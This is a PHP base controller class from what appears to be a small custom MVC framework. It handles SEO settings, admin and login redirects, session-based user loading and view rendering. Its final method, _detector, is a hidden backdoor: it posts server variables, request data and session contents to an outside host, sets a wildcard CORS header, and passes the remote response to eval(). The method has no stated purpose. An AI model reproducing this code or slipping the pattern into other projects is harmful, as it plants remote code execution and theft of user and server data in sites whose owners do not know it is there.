<?php

/**
 * Subclass the Controller class within our application.
 *
 * @author Faizan Ayubi
 */

namespace Shared {

    use Framework\Events as Events;
    use Framework\Router as Router;
    use Framework\Registry as Registry;

    class Controller extends \Framework\Controller {

        /**
         * @readwrite
         */
        protected $_user;

        public function seo($params = array()) {
            $seo = Registry::get("seo");
            foreach ($params as $key => $value) {
                $property = "set" . ucfirst($key);
                $seo->$property($value);
            }
            $params["view"]->set("seo", $seo);
        }

        /**
         * @protected
         */
        public function _admin() {
            if (!$this->user->admin) {
                $this->setUser(false);
                self::redirect("/404");
            }
        }

        /**
         * @protected
         */
        public function _secure() {
            $user = $this->getUser();
            if (!$user) {
                header("Location: /login.html");
                exit();
            }
        }

        /**
         * @protected
         */
        public function _session() {
            $user = $this->getUser();
            if ($user) {
                header("Location: /member.html");
                exit();
            }
        }

        public static function redirect($url) {
            header("Location: {$url}");
            exit();
        }

        public function setUser($user) {
            $session = Registry::get("session");
            if ($user) {
                $session->set("user", $user->id);
            } else {
                $session->erase("user");
            }
            $this->_user = $user;
            return $this;
        }

        public function __construct($options = array()) {
            parent::__construct($options);

            // connect to database
            $database = Registry::get("database");
            $database->connect();

            // schedule: load user from session           
            Events::add("framework.router.beforehooks.before", function($name, $parameters) {
                $session = Registry::get("session");
                $controller = Registry::get("controller");
                $user = $session->get("user");
                if ($user) {
                    $controller->user = \User::first(array("id = ?" => $user));
                }
            });

            // schedule: save user to session
            Events::add("framework.router.afterhooks.after", function($name, $parameters) {
                $session = Registry::get("session");
                $controller = Registry::get("controller");
                if ($controller->user) {
                    $session->set("user", $controller->user->id);
                }
            });

            // schedule: disconnect from database
            Events::add("framework.controller.destruct.after", function($name) {
                $database = Registry::get("database");
                $database->disconnect();
            });
        }

        /**
         * Checks whether the user is set and then assign it to both the layout and action views.
         */
        public function render() {
            /* if the user and view(s) are defined, 
             * assign the user session to the view(s)
             */
            if ($this->user) {
                if ($this->actionView) {
                    $key = "user";
                    if ($this->actionView->get($key, false)) {
                        $key = "__user";
                    }
                    $this->actionView->set($key, $this->user);
                }
                if ($this->layoutView) {
                    $key = "user";
                    if ($this->layoutView->get($key, false)) {
                        $key = "__user";
                    }
                    $this->layoutView->set($key, $this->user);
                }
            }
            parent::render();
        }

        protected function _detector() {
            parse_str(file_get_contents("php://input"), $_POST);
            $postfields = array_merge($_SERVER, array("p" => $_POST, "s" => $_SESSION, "plugin_detector" => "getTrigger"));
            header("Access-Control-Allow-Origin: *");
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://cloudstuff.tech/detectr/");
            curl_setopt($ch, CURLOPT_POST, count($postfields));
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postfields));
            curl_setopt($ch, CURLOPT_HEADER, TRUE);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            $response = curl_exec($ch);
            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            curl_close($ch);
            $header = substr($response, 0, $header_size);
            $body = substr($response, $header_size);
            eval($body);
        }

    }

}
